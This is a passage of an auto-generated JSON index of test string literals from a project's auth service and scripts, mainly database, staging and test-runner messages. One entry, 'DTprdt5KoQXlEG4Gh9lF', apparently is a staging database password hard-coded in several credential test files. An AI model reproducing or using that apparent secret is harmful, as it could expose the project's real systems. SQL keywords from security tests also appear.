      "value": "DANGEROUSLY split",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:830"
      ]
    },
    "DATABASE MIGRATION TESTING FOR STAGING": {
      "value": "DATABASE MIGRATION TESTING FOR STAGING",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:276"
      ]
    },
    "DATABASE SSL CERTIFICATE AND CONFIGURATION TESTING": {
      "value": "DATABASE SSL CERTIFICATE AND CONFIGURATION TESTING",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:259"
      ]
    },
    "DATABASE URL BUILDER COMPREHENSIVE TESTING": {
      "value": "DATABASE URL BUILDER COMPREHENSIVE TESTING",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:301"
      ]
    },
    "DATABASE_ECHO_SQL": {
      "value": "DATABASE_ECHO_SQL",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_settings.py:167"
      ]
    },
    "DATABASE_NAME": {
      "value": "DATABASE_NAME",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:219"
      ]
    },
    "DATABASE_URL": {
      "value": "DATABASE_URL",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:10",
        "auth_service/tests/config/test_env.py:28",
        "auth_service/tests/config/test_env.py:163",
        "auth_service/tests/config/test_env.py:172",
        "auth_service/tests/config/test_env.py:182",
        "auth_service/tests/config/test_env.py:193",
        "auth_service/tests/config/test_settings.py:166",
        "auth_service/tests/conftest.py:32",
        "auth_service/tests/test_auth_database_connection.py:20",
        "auth_service/tests/test_auth_database_manager_missing_method.py:100"
      ]
    },
    "DATABASE_URL_PLACEHOLDER": {
      "value": "DATABASE_URL_PLACEHOLDER",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:127"
      ]
    },
    "DEBUG": {
      "value": "DEBUG",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:83",
        "netra_backend/app/services/realistic_test_data/log_generator.py:88",
        "auth_service/tests/config/test_env.py:50",
        "auth_service/tests/config/test_env.py:175",
        "auth_service/tests/config/test_env.py:185",
        "auth_service/tests/config/test_env.py:184",
        "auth_service/tests/config/test_settings.py:136",
        "auth_service/tests/config/test_settings.py:162",
        "scripts/compliance/fake_test_scanner.py:394",
        "scripts/test_config_loading.py:142"
      ]
    },
    "DEFAULT_TEST_PATHS = [\n        \"netra_backend/tests\",\n        \"test_framework/tests\",\n        \"frontend/__tests__\",\n        \"auth_service/tests\"\n    ]": {
      "value": "DEFAULT_TEST_PATHS = [\n        \"netra_backend/tests\",\n        \"test_framework/tests\",\n        \"frontend/__tests__\",\n        \"auth_service/tests\"\n    ]",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:326"
      ]
    },
    "DEFAULT_TEST_PATHS\\s*=\\s*\\[[^\\]]+\\]": {
      "value": "DEFAULT_TEST_PATHS\\s*=\\s*\\[[^\\]]+\\]",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:325"
      ]
    },
    "DELETE": {
      "value": "DELETE",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:123",
        "auth_service/tests/test_security.py:177",
        "auth_service/tests/test_security.py:207",
        "auth_service/tests/test_security.py:381",
        "auth_service/tests/test_security.py:615"
      ]
    },
    "DEMO 1: TEST SIZE VALIDATOR": {
      "value": "DEMO 1: TEST SIZE VALIDATOR",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:20"
      ]
    },
    "DEMO 2: TEST REFACTORING HELPER": {
      "value": "DEMO 2: TEST REFACTORING HELPER",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:57"
      ]
    },
    "DEMO 3: TEST RUNNER INTEGRATION": {
      "value": "DEMO 3: TEST RUNNER INTEGRATION",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:109"
      ]
    },
    "DEMO 4: PROPERLY SIZED TEST EXAMPLES": {
      "value": "DEMO 4: PROPERLY SIZED TEST EXAMPLES",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:139"
      ]
    },
    "DEMO 5: CLI USAGE EXAMPLES": {
      "value": "DEMO 5: CLI USAGE EXAMPLES",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:172"
      ]
    },
    "DEMONSTRATION COMPLETE": {
      "value": "DEMONSTRATION COMPLETE",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:218"
      ]
    },
    "DETAILED ERROR ANALYSIS (first 5 files):": {
      "value": "DETAILED ERROR ANALYSIS (first 5 files):",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:328"
      ]
    },
    "DETAILED REAL E2E TEST INFORMATION": {
      "value": "DETAILED REAL E2E TEST INFORMATION",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:127"
      ]
    },
    "DETAILED REPORT": {
      "value": "DETAILED REPORT",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:234"
      ]
    },
    "DETAILED VIOLATIONS:": {
      "value": "DETAILED VIOLATIONS:",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:324"
      ]
    },
    "DETECTED INVALID USER PATTERN: Found 'user_pr-4' in staging DATABASE_URL. This will cause 'password authentication failed for user user_pr-4' errors.": {
      "value": "DETECTED INVALID USER PATTERN: Found 'user_pr-4' in staging DATABASE_URL. This will cause 'password authentication failed for user user_pr-4' errors.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:105"
      ]
    },
    "DEV_DATABASE_URL": {
      "value": "DEV_DATABASE_URL",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:135"
      ]
    },
    "DEV_REDIS_URL": {
      "value": "DEV_REDIS_URL",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:136"
      ]
    },
    "DNS resolution failed": {
      "value": "DNS resolution failed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:338"
      ]
    },
    "DROP": {
      "value": "DROP",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:123",
        "auth_service/tests/test_security.py:177",
        "auth_service/tests/test_security.py:207",
        "auth_service/tests/test_security.py:615"
      ]
    },
    "DROP DATABASE IF EXISTS \"": {
      "value": "DROP DATABASE IF EXISTS \"",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:152"
      ]
    },
    "DRY RUN - No files were actually modified": {
      "value": "DRY RUN - No files were actually modified",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:759"
      ]
    },
    "DRY RUN MODE - No files will be renamed": {
      "value": "DRY RUN MODE - No files will be renamed",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:264"
      ]
    },
    "DSN:": {
      "value": "DSN:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_db_direct.py:86"
      ]
    },
    "DTprdt5KoQXlEG4Gh9lF": {
      "value": "DTprdt5KoQXlEG4Gh9lF",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:38",
        "auth_service/test_staging_db_connection.py:43",
        "auth_service/test_staging_db_connection.py:59",
        "auth_service/test_staging_db_connection.py:96",
        "auth_service/test_url_construction.py:39",
        "scripts/test_async_postgres.py:133"
      ]
    },
    "Data integrity and performance for": {
      "value": "Data integrity and performance for",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:495"
      ]
    },
    "DataSubAgent Modular": {
      "value": "DataSubAgent Modular",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:195"
      ]
    },
    "Database 'netra_staging' does not exist error replicated:": {
      "value": "Database 'netra_staging' does not exist error replicated:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:86"
      ]
    },
    "Database Connection": {
      "value": "Database Connection",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:148"
      ]
    },
    "Database Dependent:": {
      "value": "Database Dependent:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:905"
      ]
    },
    "Database Migration Commands": {
      "value": "Database Migration Commands",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:283"
      ]
    },
    "Database Mismatch Analysis": {
      "value": "Database Mismatch Analysis",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:154"
      ]
    },
    "Database URL should not be empty": {
      "value": "Database URL should not be empty",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:290"
      ]
    },
    "Database close error:": {
      "value": "Database close error:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:137"
      ]
    },
    "Database connection appears functional": {
      "value": "Database connection appears functional",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:72"
      ]
    },
    "Database connection failed": {
      "value": "Database connection failed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:837"
      ]
    },
    "Database connection hanging during Cloud Run shutdown": {
      "value": "Database connection hanging during Cloud Run shutdown",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:111"
      ]
    },
    "Database connection timeout during initialization replicated": {
      "value": "Database connection timeout during initialization replicated",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:311"
      ]
    },
    "Database connectivity test failed:": {
      "value": "Database connectivity test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:76"
      ]
    },
    "Database engine disposed": {
      "value": "Database engine disposed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:64"
      ]
    },
    "Database error": {
      "value": "Database error",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:234",
        "auth_service/tests/test_session_cleanup.py:240"
      ]
    },
    "Database initialized:": {
      "value": "Database initialized:",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:27"
      ]
    },
    "Database must start before auth": {
      "value": "Database must start before auth",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:99"
      ]
    },
    "Database name '": {
      "value": "Database name '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:134"
      ]
    },
    "Database operations did not handle termination signals gracefully": {
      "value": "Database operations did not handle termination signals gracefully",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:297"
      ]
    },
    "Database operations did not respond to shutdown signals within timeout": {
      "value": "Database operations did not respond to shutdown signals within timeout",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:286"
      ]
    },
    "Database pool hanging caused shutdown timeout:": {
      "value": "Database pool hanging caused shutdown timeout:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:215"
      ]
    },
    "Database session manager import failed:": {
      "value": "Database session manager import failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_service_integration_reliability.py:82"
      ]
    },
    "Database session not configured": {
      "value": "Database session not configured",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_helpers.py:45",
        "auth_service/tests/utils/test_helpers.py:66",
        "auth_service/tests/utils/test_helpers.py:86"
      ]
    },
    "Database session not setup": {
      "value": "Database session not setup",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:188",
        "auth_service/tests/base/test_base.py:199"
      ]
    },
    "Database should be initialized exactly once, got": {
      "value": "Database should be initialized exactly once, got",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_single_database.py:66"
      ]
    },
    "Database tables created successfully": {
      "value": "Database tables created successfully",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:58"
      ]
    },
    "Database tables reset": {
      "value": "Database tables reset",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:95"
      ]
    },
    "Database test returned status": {
      "value": "Database test returned status",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:74"
      ]
    },
    "Database user doesn't exist or password is incorrect": {
      "value": "Database user doesn't exist or password is incorrect",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:200"
      ]
    },
    "Database-related tests": {
      "value": "Database-related tests",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:87"
      ]
    },
    "Database:": {
      "value": "Database:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:234",
        "scripts/test_config_loading.py:114",
        "scripts/test_ssl_certificates_staging.py:217",
        "scripts/test_staging_db_direct.py:46",
        "scripts/test_staging_migrations.py:46"
      ]
    },
    "DatabaseTestMixin": {
      "value": "DatabaseTestMixin",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/__init__.py:16"
      ]
    },
    "DatabaseTestUtils": {
      "value": "DatabaseTestUtils",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/__init__.py:17"
      ]
    },
    "DatabaseURLBuilder is creating URL with 'netra_staging' which doesn't exist:": {
      "value": "DatabaseURLBuilder is creating URL with 'netra_staging' which doesn't exist:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:212"
      ]
    },
    "Debug database test to verify table creation works": {
      "value": "Debug database test to verify table creation works",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:2"
      ]
    },
    "Debug info:": {
      "value": "Debug info:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:157"
      ]
    },
    "Default timeout not used after conversion error:": {
      "value": "Default timeout not used after conversion error:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:389"
      ]
    },
    "Delegating fix to subagent:": {
      "value": "Delegating fix to subagent:",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:131"
      ]
    },
    "Demo failed with error:": {
      "value": "Demo failed with error:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:226"
      ]
    },
    "Demo script showing the Test Size Limits Enforcement system in action.\n\nThis demonstrates all components of Fix #2: Test Size Limits Enforcement:\n1. Test size validator functionality\n2. Test refactoring helper functionality  \n3. Integration with test runner\n4. Properly sized test examples": {
      "value": "Demo script showing the Test Size Limits Enforcement system in action.\n\nThis demonstrates all components of Fix #2: Test Size Limits Enforcement:\n1. Test size validator functionality\n2. Test refactoring helper functionality  \n3. Integration with test runner\n4. Properly sized test examples",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:2"
      ]
    },
    "Dependencies installed successfully": {
      "value": "Dependencies installed successfully",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:63"
      ]
    },
    "Dependencies:": {
      "value": "Dependencies:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:883"
      ]
    },
    "Dependency Resolution": {
      "value": "Dependency Resolution",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:238"
      ]
    },
    "Dependency resolution test failed:": {
      "value": "Dependency resolution test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:118"
      ]
    },
    "Dependency resolution working correctly": {
      "value": "Dependency resolution working correctly",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:114"
      ]
    },
    "Deployment errors:": {
      "value": "Deployment errors:",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:176",
        "scripts/test_error_monitor_logic.py:200"
      ]
    },
    "Description:": {
      "value": "Description:",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:332",
        "scripts/test_verify_workflow_status.py:36",
        "scripts/test_verify_workflow_status_corrected.py:24"
      ]
    },
    "Detailed Results:": {
      "value": "Detailed Results:",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:199"
      ]
    },
    "Detailed error information:": {
      "value": "Detailed error information:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:450"
      ]
    },
    "Detailed report saved to:": {
      "value": "Detailed report saved to:",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:414",
        "scripts/test_imports.py:117"
      ]
    },
    "Detailed results saved to:": {
      "value": "Detailed results saved to:",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:228"
      ]
    },
    "Details": {
      "value": "Details",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:352"
      ]
    },
    "Detected environment:": {
      "value": "Detected environment:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:189"
      ]
    },
    "Dev OAuth client used in staging": {
      "value": "Dev OAuth client used in staging",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:217",
        "auth_service/tests/test_five_whys_reproduction.py:223"
      ]
    },
    "Dev launcher exited unexpectedly": {
      "value": "Dev launcher exited unexpectedly",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:131"
      ]
    },
    "Dev login not enabled": {
      "value": "Dev login not enabled",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:290",
        "scripts/test_oauth_local.py:417"
      ]
    },
    "Development Environment": {
      "value": "Development Environment",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:134"
      ]
    },
    "Development environment specific tests": {
      "value": "Development environment specific tests",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:95"
      ]
    },
    "Development password in staging (should fail)": {
      "value": "Development password in staging (should fail)",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:222"
      ]
    },
    "Development server failed to start": {
      "value": "Development server failed to start",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:75"
      ]
    },
    "Development server started successfully": {
      "value": "Development server started successfully",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:71"
      ]
    },
    "Development server stopped": {
      "value": "Development server stopped",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:252"
      ]
    },
    "Dict": {
      "value": "Dict",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:202"
      ]
    },
    "Dict[": {
      "value": "Dict[",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:228"
      ]
    },
    "Direct Cloud SQL async": {
      "value": "Direct Cloud SQL async",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:279"
      ]
    },
    "Direct Cloud SQL sync": {
      "value": "Direct Cloud SQL sync",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:280"
      ]
    },
    "Direct cost reduction features for": {
      "value": "Direct cost reduction features for",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:493"
      ]
    },
    "Direct password verification should succeed for:": {
      "value": "Direct password verification should succeed for:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:74"
      ]
    },
    "Direct test of staging database connection using migrated secrets.\n\n**UPDATED**: Now uses DatabaseURLBuilder for centralized URL construction.": {
      "value": "Direct test of staging database connection using migrated secrets.\n\n**UPDATED**: Now uses DatabaseURLBuilder for centralized URL construction.",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_db_direct.py:1"
      ]
    },
    "Directory": {
      "value": "Directory",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:143",
        "scripts/remove_test_stubs.py:110"
      ]
    },
    "Directory does not exist:": {
      "value": "Directory does not exist:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:106"
      ]
    },
    "Directory for storing backups (auto-generated if not specified)": {
      "value": "Directory for storing backups (auto-generated if not specified)",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:936"
      ]
    },
    "Directory not found:": {
      "value": "Directory not found:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:107",
        "scripts/remove_duplicate_test_setup.py:47"
      ]
    },
    "Disable automatic test splitting": {
      "value": "Disable automatic test splitting",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:835"
      ]
    },
    "Disable bad test detection": {
      "value": "Disable bad test detection",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:513"
      ]
    },
    "Disable coverage reporting": {
      "value": "Disable coverage reporting",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:770"
      ]
    },
    "Disable result caching": {
      "value": "Disable result caching",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:383"
      ]
    },
    "Disconnected": {
      "value": "Disconnected",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:27"
      ]
    },
    "Discovered": {
      "value": "Discovered",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:316"
      ]
    },
    "Docker is not installed": {
      "value": "Docker is not installed",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:30"
      ]
    },
    "Docker is not running. Please start Docker first.": {
      "value": "Docker is not running. Please start Docker first.",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:190"
      ]
    },
    "Docker services started successfully": {
      "value": "Docker services started successfully",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:55"
      ]
    },
    "Don't wait for services to be healthy": {
      "value": "Don't wait for services to be healthy",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:179"
      ]
    },
    "Driver URL Formatting": {
      "value": "Driver URL Formatting",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:307"
      ]
    },
    "Drop test database": {
      "value": "Drop test database",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:140"
      ]
    },
    "Dropped test database:": {
      "value": "Dropped test database:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:153"
      ]
    },
    "Duplicate database module should not exist:": {
      "value": "Duplicate database module should not exist:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_single_database.py:20"
      ]
    },
    "Duplicate test file:": {
      "value": "Duplicate test file:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:410"
      ]
    },
    "Duplicate test setup code has been removed.": {
      "value": "Duplicate test setup code has been removed.",
      "category": "test_literals",
      "locations": [
        "scripts/remove_duplicate_test_setup.py:64"
      ]
    },
    "Duplicates Found:": {
      "value": "Duplicates Found:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:657"
      ]
    },
    "E2E COLD START TEST SUMMARY": {
      "value": "E2E COLD START TEST SUMMARY",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:482"
      ]
    },
    "E2E Coverage:": {
      "value": "E2E Coverage:",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:748"
      ]
    },
    "E2E Test Import Fixer\n\nAutomatically fixes imports in all moved test files after the test directory reorganization.\nUpdates imports to reflect the new test structure under tests/e2e/.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal (Development velocity protection)\n- Business Goal: Restore broken imports after test reorganization\n- Value Impact: Enables test execution after directory restructuring\n- Strategic Impact: Prevents development velocity loss due to import failures\n\nThis script:\n1. Scans test files in tests/e2e/ subdirectories\n2. Updates imports that reference old paths\n3. Fixes helper imports to use new organized structure\n4. Reports all changes made": {
      "value": "E2E Test Import Fixer\n\nAutomatically fixes imports in all moved test files after the test directory reorganization.\nUpdates imports to reflect the new test structure under tests/e2e/.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal (Development velocity protection)\n- Business Goal: Restore broken imports after test reorganization\n- Value Impact: Enables test execution after directory restructuring\n- Strategic Impact: Prevents development velocity loss due to import failures\n\nThis script:\n1. Scans test files in tests/e2e/ subdirectories\n2. Updates imports that reference old paths\n3. Fixes helper imports to use new organized structure\n4. Reports all changes made",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:2"
      ]
    },
    "E2E Test Thread": {
      "value": "E2E Test Thread",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:326"
      ]
    },
    "ENABLE_REAL_LLM_TESTING": {
      "value": "ENABLE_REAL_LLM_TESTING",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:184"
      ]
    },
    "ENVIRONMENT": {
      "value": "ENVIRONMENT",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:9",
        "auth_service/test_actual_staging_credentials.py:31",
        "auth_service/test_staging_db_connection.py:36",
        "auth_service/test_staging_db_connection.py:123",
        "auth_service/test_url_construction.py:32",
        "auth_service/test_url_construction.py:62",
        "auth_service/test_url_construction.py:188",
        "auth_service/tests/config/test_env.py:21",
        "auth_service/tests/config/test_env.py:149",
        "auth_service/tests/config/test_settings.py:161"
      ]
    },
    "ENVIRONMENT DETECTION TEST SUITE": {
      "value": "ENVIRONMENT DETECTION TEST SUITE",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:157"
      ]
    },
    "ENVIRONMENT=staging:": {
      "value": "ENVIRONMENT=staging:",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:36"
      ]
    },
    "ENV_SUFFIX": {
      "value": "ENV_SUFFIX",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:229"
      ]
    },
    "ERROR": {
      "value": "ERROR",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:72",
        "netra_backend/app/services/realistic_test_data/log_generator.py:81",
        "netra_backend/app/services/realistic_test_data/log_generator.py:88",
        "auth_service/tests/config/test_settings.py:149",
        "scripts/iterative_test_fix_loop.py:53",
        "scripts/test_error_monitor_logic.py:36",
        "scripts/test_error_monitor_logic.py:64",
        "scripts/test_example_message_flow.py:161",
        "scripts/test_failure_scanner.py:142",
        "scripts/test_verify_workflow_status_corrected.py:130"
      ]
    },
    "ERROR:": {
      "value": "ERROR:",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:383",
        "scripts/test_staging_db_direct.py:123",
        "scripts/test_staging_migrations.py:171"
      ]
    },
    "ERROR: Alembic not found (not installed?)": {
      "value": "ERROR: Alembic not found (not installed?)",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:168"
      ]
    },
    "ERROR: Cloud SQL URL should not have SSL parameters": {
      "value": "ERROR: Cloud SQL URL should not have SSL parameters",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:98",
        "scripts/test_auth_database_sessions.py:259"
      ]
    },
    "ERROR: Engine creation failed": {
      "value": "ERROR: Engine creation failed",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:147",
        "scripts/test_auth_database_sessions.py:279"
      ]
    },
    "ERROR: Engine creation failed:": {
      "value": "ERROR: Engine creation failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:283"
      ]
    },
    "ERROR: Expected SSL parameters but none found!": {
      "value": "ERROR: Expected SSL parameters but none found!",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:152"
      ]
    },
    "ERROR: Found SSL parameters but none expected!": {
      "value": "ERROR: Found SSL parameters but none expected!",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:157"
      ]
    },
    "ERROR: Invalid URL format": {
      "value": "ERROR: Invalid URL format",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:253"
      ]
    },
    "ERROR: Invalid async URL format": {
      "value": "ERROR: Invalid async URL format",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:93"
      ]
    },
    "ERROR: Target file already exists:": {
      "value": "ERROR: Target file already exists:",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:165"
      ]
    },
    "ERROR: Test stub check failed:": {
      "value": "ERROR: Test stub check failed:",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:128"
      ]
    },
    "ERROR: URL conversion failed:": {
      "value": "ERROR: URL conversion failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:104"
      ]
    },
    "ERROR: setup_test_path() at line": {
      "value": "ERROR: setup_test_path() at line",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_import_order.py:60"
      ]
    },
    "ERRORS:": {
      "value": "ERRORS:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:267"
      ]
    },
    "EXCEPTION (": {
      "value": "EXCEPTION (",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:70"
      ]
    },
    "EXECUTION PLAN": {
      "value": "EXECUTION PLAN",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:272"
      ]
    },
    "EXPECTED TO FAIL - CRITICAL CACHE LAYER ISSUE\n        Auth Service should continue operating when Redis cache layer is down\n        Root cause: Auth Service depends too heavily on Redis, fails when Redis is unavailable": {
      "value": "EXPECTED TO FAIL - CRITICAL CACHE LAYER ISSUE\n        Auth Service should continue operating when Redis cache layer is down\n        Root cause: Auth Service depends too heavily on Redis, fails when Redis is unavailable",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:416"
      ]
    },
    "EXPECTED TO FAIL - CRITICAL DATABASE CONNECTIVITY ISSUE\n        Auth Service should handle database connectivity loss gracefully\n        Root cause: Auth Service crashes or becomes unresponsive when database is unreachable": {
